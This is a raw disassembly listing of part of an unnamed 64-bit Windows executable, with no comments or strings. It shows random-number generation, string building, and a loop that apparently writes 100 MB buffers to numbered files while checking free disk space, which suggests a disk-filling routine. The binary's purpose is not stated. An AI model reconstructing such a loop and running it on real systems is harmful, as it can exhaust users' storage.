   140002cf4:	48 8b cb             	mov    %rbx,%rcx
   140002cf7:	e8 e4 41 00 00       	call   0x140006ee0
   140002cfc:	90                   	nop
   140002cfd:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002d01:	ff 15 a1 65 00 00    	call   *0x65a1(%rip)        # 0x1400092a8
   140002d07:	90                   	nop
   140002d08:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002d0c:	ff 15 96 65 00 00    	call   *0x6596(%rip)        # 0x1400092a8
   140002d12:	90                   	nop
   140002d13:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002d18:	ff 15 8a 65 00 00    	call   *0x658a(%rip)        # 0x1400092a8
   140002d1e:	85 f6                	test   %esi,%esi
   140002d20:	78 0d                	js     0x140002d2f
   140002d22:	48 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%rcx
   140002d29:	48 8b 01             	mov    (%rcx),%rax
   140002d2c:	ff 50 10             	call   *0x10(%rax)
   140002d2f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002d33:	48 8b 01             	mov    (%rcx),%rax
   140002d36:	ff 50 10             	call   *0x10(%rax)
   140002d39:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002d3d:	48 8b 01             	mov    (%rcx),%rax
   140002d40:	ff 50 10             	call   *0x10(%rax)
   140002d43:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002d47:	48 8b 01             	mov    (%rcx),%rax
   140002d4a:	ff 50 10             	call   *0x10(%rax)
   140002d4d:	ff 15 c5 68 00 00    	call   *0x68c5(%rip)        # 0x140009618
   140002d53:	8b c6                	mov    %esi,%eax
   140002d55:	e9 cb f9 ff ff       	jmp    0x140002725
   140002d5a:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d5f:	e8 bc 3f 00 00       	call   0x140006d20
   140002d64:	90                   	nop
   140002d65:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d6a:	e8 b1 3f 00 00       	call   0x140006d20
   140002d6f:	90                   	nop
   140002d70:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d75:	e8 a6 3f 00 00       	call   0x140006d20
   140002d7a:	90                   	nop
   140002d7b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d80:	e8 9b 3f 00 00       	call   0x140006d20
   140002d85:	90                   	nop
   140002d86:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d8b:	e8 90 3f 00 00       	call   0x140006d20
   140002d90:	90                   	nop
   140002d91:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d96:	e8 85 3f 00 00       	call   0x140006d20
   140002d9b:	90                   	nop
   140002d9c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002da1:	e8 7a 3f 00 00       	call   0x140006d20
   140002da6:	90                   	nop
   140002da7:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002dac:	e8 6f 3f 00 00       	call   0x140006d20
   140002db1:	cc                   	int3
   140002db2:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002db7:	e8 64 3f 00 00       	call   0x140006d20
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002dca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002dcf:	55                   	push   %rbp
   140002dd0:	41 54                	push   %r12
   140002dd2:	41 55                	push   %r13
   140002dd4:	41 56                	push   %r14
   140002dd6:	41 57                	push   %r15
   140002dd8:	48 8d ac 24 70 ec ff 	lea    -0x1390(%rsp),%rbp
   140002ddf:	ff 
   140002de0:	b8 90 14 00 00       	mov    $0x1490,%eax
   140002de5:	e8 f6 46 00 00       	call   0x1400074e0
   140002dea:	48 2b e0             	sub    %rax,%rsp
   140002ded:	48 8b 05 4c b2 00 00 	mov    0xb24c(%rip),%rax        # 0x14000e040
   140002df4:	48 33 c4             	xor    %rsp,%rax
   140002df7:	48 89 85 80 13 00 00 	mov    %rax,0x1380(%rbp)
   140002dfe:	33 f6                	xor    %esi,%esi
   140002e00:	ff 15 12 64 00 00    	call   *0x6412(%rip)        # 0x140009218
   140002e06:	c7 85 74 13 00 00 ff 	movl   $0xffffffff,0x1374(%rbp)
   140002e0d:	ff ff ff 
   140002e10:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140002e13:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e1f:	00 
   140002e20:	8b c8                	mov    %eax,%ecx
   140002e22:	c1 e9 1e             	shr    $0x1e,%ecx
   140002e25:	33 c8                	xor    %eax,%ecx
   140002e27:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   140002e2d:	03 c2                	add    %edx,%eax
   140002e2f:	89 44 95 f4          	mov    %eax,-0xc(%rbp,%rdx,4)
   140002e33:	48 ff c2             	inc    %rdx
   140002e36:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140002e3d:	72 e1                	jb     0x140002e20
   140002e3f:	c7 45 f0 70 02 00 00 	movl   $0x270,-0x10(%rbp)
   140002e46:	48 8d 1d 0f 6e 00 00 	lea    0x6e0f(%rip),%rbx        # 0x140009c5c
   140002e4d:	4c 8d 35 fc 6d 00 00 	lea    0x6dfc(%rip),%r14        # 0x140009c50
   140002e54:	48 8d 3d 05 6e 00 00 	lea    0x6e05(%rip),%rdi        # 0x140009c60
   140002e5b:	49 bc ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%r12
   140002e62:	ff ff 7f 
   140002e65:	41 bd 00 5e d0 b2    	mov    $0xb2d05e00,%r13d
   140002e6b:	49 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r15
   140002e72:	ff ff 7f 
   140002e75:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e79:	e8 b2 3c 00 00       	call   0x140006b30
   140002e7e:	8b c8                	mov    %eax,%ecx
   140002e80:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002e87:	81 f9 ef 2d 01 00    	cmp    $0x12def,%ecx
   140002e8d:	77 1b                	ja     0x140002eaa
   140002e8f:	90                   	nop
   140002e90:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e94:	e8 97 3c 00 00       	call   0x140006b30
   140002e99:	8b c8                	mov    %eax,%ecx
   140002e9b:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002ea2:	81 f9 f0 2d 01 00    	cmp    $0x12df0,%ecx
   140002ea8:	72 e6                	jb     0x140002e90
   140002eaa:	48 c1 e9 20          	shr    $0x20,%rcx
   140002eae:	81 e9 f0 d8 ff 7f    	sub    $0x7fffd8f0,%ecx
   140002eb4:	0f ba f9 1f          	btc    $0x1f,%ecx
   140002eb8:	4c 8d 4d e2          	lea    -0x1e(%rbp),%r9
   140002ebc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ec0:	49 83 e9 02          	sub    $0x2,%r9
   140002ec4:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
   140002ec9:	f7 e1                	mul    %ecx
   140002ecb:	c1 ea 03             	shr    $0x3,%edx
   140002ece:	0f b7 c2             	movzwl %dx,%eax
   140002ed1:	66 c1 e0 02          	shl    $0x2,%ax
   140002ed5:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   140002ed9:	66 45 03 c0          	add    %r8w,%r8w
   140002edd:	66 41 2b c8          	sub    %r8w,%cx
   140002ee1:	66 83 c1 30          	add    $0x30,%cx
   140002ee5:	66 41 89 09          	mov    %cx,(%r9)
   140002ee9:	8b ca                	mov    %edx,%ecx
   140002eeb:	85 d2                	test   %edx,%edx
   140002eed:	75 d1                	jne    0x140002ec0
   140002eef:	4c 8d 45 e2          	lea    -0x1e(%rbp),%r8
   140002ef3:	49 8b d1             	mov    %r9,%rdx
   140002ef6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002efb:	e8 30 30 00 00       	call   0x140005f30
   140002f00:	90                   	nop
   140002f01:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140002f06:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f0b:	48 8b c1             	mov    %rcx,%rax
   140002f0e:	49 2b c0             	sub    %r8,%rax
   140002f11:	48 83 f8 06          	cmp    $0x6,%rax
   140002f15:	0f 82 93 00 00 00    	jb     0x140002fae
   140002f1b:	49 8d 40 06          	lea    0x6(%r8),%rax
   140002f1f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f24:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002f29:	48 83 f9 07          	cmp    $0x7,%rcx
   140002f2d:	48 0f 47 7c 24 30    	cmova  0x30(%rsp),%rdi
   140002f33:	48 3b df             	cmp    %rdi,%rbx
   140002f36:	76 1e                	jbe    0x140002f56
   140002f38:	4a 8d 04 47          	lea    (%rdi,%r8,2),%rax
   140002f3c:	4c 3b f0             	cmp    %rax,%r14
   140002f3f:	77 15                	ja     0x140002f56
   140002f41:	49 3b fe             	cmp    %r14,%rdi
   140002f44:	77 05                	ja     0x140002f4b
   140002f46:	48 8b de             	mov    %rsi,%rbx
   140002f49:	eb 10                	jmp    0x140002f5b
   140002f4b:	48 8b df             	mov    %rdi,%rbx
   140002f4e:	49 2b de             	sub    %r14,%rbx
   140002f51:	48 d1 fb             	sar    $1,%rbx
   140002f54:	eb 05                	jmp    0x140002f5b
   140002f56:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002f5b:	4e 8d 04 45 02 00 00 	lea    0x2(,%r8,2),%r8
   140002f62:	00 
   140002f63:	48 8d 4f 0c          	lea    0xc(%rdi),%rcx
   140002f67:	48 8b d7             	mov    %rdi,%rdx
   140002f6a:	e8 e2 4f 00 00       	call   0x140007f51
   140002f6f:	48 03 db             	add    %rbx,%rbx
   140002f72:	4c 8b c3             	mov    %rbx,%r8
   140002f75:	49 8b d6             	mov    %r14,%rdx
   140002f78:	48 8b cf             	mov    %rdi,%rcx
   140002f7b:	e8 cb 4f 00 00       	call   0x140007f4b
   140002f80:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002f86:	4c 2b c3             	sub    %rbx,%r8
   140002f89:	49 8d 56 0c          	lea    0xc(%r14),%rdx
   140002f8d:	48 03 d3             	add    %rbx,%rdx
   140002f90:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002f94:	e8 b2 4f 00 00       	call   0x140007f4b
   140002f99:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002f9e:	48 8d 1d b7 6c 00 00 	lea    0x6cb7(%rip),%rbx        # 0x140009c5c
   140002fa5:	48 8d 3d b4 6c 00 00 	lea    0x6cb4(%rip),%rdi        # 0x140009c60
   140002fac:	eb 18                	jmp    0x140002fc6
   140002fae:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140002fb5:	00 00 
   140002fb7:	ba 06 00 00 00       	mov    $0x6,%edx
   140002fbc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002fc1:	e8 aa 39 00 00       	call   0x140006970
   140002fc6:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002fc9:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fcd:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002fd0:	f3 0f 7f 4d a8       	movdqu %xmm1,-0x58(%rbp)
   140002fd5:	0f 10 00             	movups (%rax),%xmm0
   140002fd8:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fdc:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002fe0:	0f 11 4d a8          	movups %xmm1,-0x58(%rbp)
   140002fe4:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002fe8:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002fef:	00 
   140002ff0:	66 89 30             	mov    %si,(%rax)
   140002ff3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002ff8:	48 83 fa 07          	cmp    $0x7,%rdx
   140002ffc:	76 37                	jbe    0x140003035
   140002ffe:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003005:	00 
   140003006:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000300b:	48 8b c1             	mov    %rcx,%rax
   14000300e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003015:	72 19                	jb     0x140003030
   140003017:	48 83 c2 27          	add    $0x27,%rdx
   14000301b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000301f:	48 2b c1             	sub    %rcx,%rax
   140003022:	48 83 e8 08          	sub    $0x8,%rax
   140003026:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000302a:	0f 87 42 01 00 00    	ja     0x140003172
   140003030:	e8 ab 3e 00 00       	call   0x140006ee0
   140003035:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140003039:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000303c:	f3 0f 7f 44 24 78    	movdqu %xmm0,0x78(%rsp)
   140003042:	48 89 75 8c          	mov    %rsi,-0x74(%rbp)
   140003046:	89 75 94             	mov    %esi,-0x6c(%rbp)
   140003049:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000304d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003052:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003057:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000305c:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140003061:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%rsp)
   140003068:	00 
   140003069:	c7 45 88 01 00 01 00 	movl   $0x10001,-0x78(%rbp)
   140003070:	45 33 c9             	xor    %r9d,%r9d
   140003073:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140003078:	ba 01 00 00 00       	mov    $0x1,%edx
   14000307d:	33 c9                	xor    %ecx,%ecx
   14000307f:	ff 15 03 62 00 00    	call   *0x6203(%rip)        # 0x140009288
   140003085:	85 c0                	test   %eax,%eax
   140003087:	75 76                	jne    0x1400030ff
   140003089:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000308d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003092:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003097:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000309c:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400030a3:	00 
   1400030a4:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400030a9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400030af:	48 8d 15 ca 6b 00 00 	lea    0x6bca(%rip),%rdx        # 0x140009c80
   1400030b6:	33 c9                	xor    %ecx,%ecx
   1400030b8:	ff 15 da 61 00 00    	call   *0x61da(%rip)        # 0x140009298
   1400030be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400030c1:	33 c0                	xor    %eax,%eax
   1400030c3:	0f 11 45 b8          	movups %xmm0,-0x48(%rbp)
   1400030c7:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   1400030cb:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400030cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400030d3:	c7 45 e0 01 00 01 00 	movl   $0x10001,-0x20(%rbp)
   1400030da:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   1400030de:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   1400030e3:	48 0f 47 55 98       	cmova  -0x68(%rbp),%rdx
   1400030e8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030ed:	4c 8d 4d b8          	lea    -0x48(%rbp),%r9
   1400030f1:	33 c9                	xor    %ecx,%ecx
   1400030f3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400030f9:	ff 15 91 61 00 00    	call   *0x6191(%rip)        # 0x140009290
   1400030ff:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003104:	e8 17 df ff ff       	call   0x140001020
   140003109:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000310e:	49 3b c4             	cmp    %r12,%rax
   140003111:	7d 0b                	jge    0x14000311e
   140003113:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140003117:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   14000311c:	eb 05                	jmp    0x140003123
   14000311e:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140003123:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003128:	e8 63 2f 00 00       	call   0x140006090
   14000312d:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140003131:	48 83 fa 07          	cmp    $0x7,%rdx
   140003135:	0f 86 3a fd ff ff    	jbe    0x140002e75
   14000313b:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003142:	00 
   140003143:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140003147:	48 8b c1             	mov    %rcx,%rax
   14000314a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003151:	72 15                	jb     0x140003168
   140003153:	48 83 c2 27          	add    $0x27,%rdx
   140003157:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000315b:	48 2b c1             	sub    %rcx,%rax
   14000315e:	48 83 e8 08          	sub    $0x8,%rax
   140003162:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003166:	77 20                	ja     0x140003188
   140003168:	e8 73 3d 00 00       	call   0x140006ee0
   14000316d:	e9 03 fd ff ff       	jmp    0x140002e75
   140003172:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003177:	45 33 c9             	xor    %r9d,%r9d
   14000317a:	45 33 c0             	xor    %r8d,%r8d
   14000317d:	33 d2                	xor    %edx,%edx
   14000317f:	33 c9                	xor    %ecx,%ecx
   140003181:	ff 15 49 63 00 00    	call   *0x6349(%rip)        # 0x1400094d0
   140003187:	cc                   	int3
   140003188:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000318d:	45 33 c9             	xor    %r9d,%r9d
   140003190:	45 33 c0             	xor    %r8d,%r8d
   140003193:	33 d2                	xor    %edx,%edx
   140003195:	33 c9                	xor    %ecx,%ecx
   140003197:	ff 15 33 63 00 00    	call   *0x6333(%rip)        # 0x1400094d0
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400031a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400031aa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400031af:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400031b4:	55                   	push   %rbp
   1400031b5:	41 56                	push   %r14
   1400031b7:	41 57                	push   %r15
   1400031b9:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   1400031c0:	ff 
   1400031c1:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   1400031c8:	48 8b 05 71 ae 00 00 	mov    0xae71(%rip),%rax        # 0x14000e040
   1400031cf:	48 33 c4             	xor    %rsp,%rax
   1400031d2:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   1400031d9:	33 c0                	xor    %eax,%eax
   1400031db:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400031de:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   1400031e4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400031e9:	b9 27 00 40 06       	mov    $0x6400027,%ecx
   1400031ee:	e8 f5 3c 00 00       	call   0x140006ee8
   1400031f3:	48 85 c0             	test   %rax,%rax
   1400031f6:	0f 84 f2 03 00 00    	je     0x1400035ee
   1400031fc:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140003200:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003204:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003208:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000320d:	48 8d b3 00 00 40 06 	lea    0x6400000(%rbx),%rsi
   140003214:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003219:	33 d2                	xor    %edx,%edx
   14000321b:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   140003221:	48 8b cb             	mov    %rbx,%rcx
   140003224:	e8 f9 4b 00 00       	call   0x140007e22
   140003229:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000322e:	45 33 c9             	xor    %r9d,%r9d
   140003231:	4c 8d 05 58 6a 00 00 	lea    0x6a58(%rip),%r8        # 0x140009c90
   140003238:	48 8d 15 61 6a 00 00 	lea    0x6a61(%rip),%rdx        # 0x140009ca0
   14000323f:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003243:	e8 78 1a 00 00       	call   0x140004cc0
   140003248:	bf 01 00 00 00       	mov    $0x1,%edi
   14000324d:	33 d2                	xor    %edx,%edx
   14000324f:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140003255:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000325a:	e8 c3 4b 00 00       	call   0x140007e22
   14000325f:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   140003263:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003268:	e8 83 1d 00 00       	call   0x140004ff0
   14000326d:	90                   	nop
   14000326e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003273:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003277:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000327c:	48 03 c8             	add    %rax,%rcx
   14000327f:	ff 15 fb 5e 00 00    	call   *0x5efb(%rip)        # 0x140009180
   140003285:	4c 8d 3d 7c 6e 00 00 	lea    0x6e7c(%rip),%r15        # 0x14000a108
   14000328c:	4c 8d 35 f5 6d 00 00 	lea    0x6df5(%rip),%r14        # 0x14000a088
   140003293:	84 c0                	test   %al,%al
   140003295:	0f 85 7d 01 00 00    	jne    0x140003418
   14000329b:	49 bc cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r12
   1400032a2:	cc cc cc 
   1400032a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400032ac:	00 00 00 00 
   1400032b0:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   1400032b6:	48 8b d3             	mov    %rbx,%rdx
   1400032b9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400032be:	ff 15 c4 5e 00 00    	call   *0x5ec4(%rip)        # 0x140009188
   1400032c4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400032c9:	e8 d2 31 00 00       	call   0x1400064a0
   1400032ce:	48 85 c0             	test   %rax,%rax
   1400032d1:	75 1f                	jne    0x1400032f2
   1400032d3:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400032d8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032dc:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400032e1:	48 03 c8             	add    %rax,%rcx
   1400032e4:	45 33 c0             	xor    %r8d,%r8d
   1400032e7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400032ec:	ff 15 7e 5f 00 00    	call   *0x5f7e(%rip)        # 0x140009270
   1400032f2:	49 8b c4             	mov    %r12,%rax
   1400032f5:	48 f7 e7             	mul    %rdi
   1400032f8:	48 c1 ea 03          	shr    $0x3,%rdx
   1400032fc:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140003300:	48 03 c9             	add    %rcx,%rcx
   140003303:	48 3b f9             	cmp    %rcx,%rdi
   140003306:	75 2d                	jne    0x140003335
   140003308:	45 33 c9             	xor    %r9d,%r9d
   14000330b:	45 33 c0             	xor    %r8d,%r8d
   14000330e:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140003312:	48 8d 0d 93 69 00 00 	lea    0x6993(%rip),%rcx        # 0x140009cac
   140003319:	ff 15 59 5d 00 00    	call   *0x5d59(%rip)        # 0x140009078
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	0f 84 51 02 00 00    	je     0x140003578
   140003327:	48 81 7d 60 00 00 40 	cmpq   $0x6400000,0x60(%rbp)
   14000332e:	06 
   14000332f:	0f 82 cd 01 00 00    	jb     0x140003502
   140003335:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000333a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000333e:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003343:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003348:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000334c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003352:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003356:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000335b:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003360:	74 28                	je     0x14000338a
   140003362:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003366:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000336b:	48 39 08             	cmp    %rcx,(%rax)
   14000336e:	75 1a                	jne    0x14000338a
   140003370:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003374:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003378:	48 89 08             	mov    %rcx,(%rax)
   14000337b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000337f:	48 89 08             	mov    %rcx,(%rax)
   140003382:	2b d1                	sub    %ecx,%edx
   140003384:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003388:	89 10                	mov    %edx,(%rax)
   14000338a:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000338e:	74 0a                	je     0x14000339a
   140003390:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003395:	e8 06 31 00 00       	call   0x1400064a0
   14000339a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000339f:	ff 15 0b 5e 00 00    	call   *0x5e0b(%rip)        # 0x1400091b0
   1400033a5:	90                   	nop
   1400033a6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400033ab:	ff 15 df 5d 00 00    	call   *0x5ddf(%rip)        # 0x140009190
   1400033b1:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400033b5:	ff 15 fd 5d 00 00    	call   *0x5dfd(%rip)        # 0x1400091b8
   1400033bb:	4c 8b cf             	mov    %rdi,%r9
   1400033be:	4c 8d 05 cb 68 00 00 	lea    0x68cb(%rip),%r8        # 0x140009c90
   1400033c5:	48 8d 15 d4 68 00 00 	lea    0x68d4(%rip),%rdx        # 0x140009ca0
   1400033cc:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400033d0:	e8 eb 18 00 00       	call   0x140004cc0
   1400033d5:	48 ff c7             	inc    %rdi
   1400033d8:	33 d2                	xor    %edx,%edx
   1400033da:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   1400033e0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033e5:	e8 38 4a 00 00       	call   0x140007e22
   1400033ea:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400033ee:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033f3:	e8 f8 1b 00 00       	call   0x140004ff0
   1400033f8:	90                   	nop
   1400033f9:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400033fe:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003402:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003407:	48 03 c8             	add    %rax,%rcx
   14000340a:	ff 15 70 5d 00 00    	call   *0x5d70(%rip)        # 0x140009180
   140003410:	84 c0                	test   %al,%al
   140003412:	0f 84 98 fe ff ff    	je     0x1400032b0
   140003418:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000341d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003421:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003426:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000342b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000342f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003435:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003439:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000343e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003443:	74 28                	je     0x14000346d
   140003445:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003449:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000344e:	48 39 08             	cmp    %rcx,(%rax)
   140003451:	75 1a                	jne    0x14000346d
   140003453:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003457:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000345b:	48 89 08             	mov    %rcx,(%rax)
   14000345e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003462:	48 89 08             	mov    %rcx,(%rax)
   140003465:	2b d1                	sub    %ecx,%edx
   140003467:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   14000346b:	89 10                	mov    %edx,(%rax)
   14000346d:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
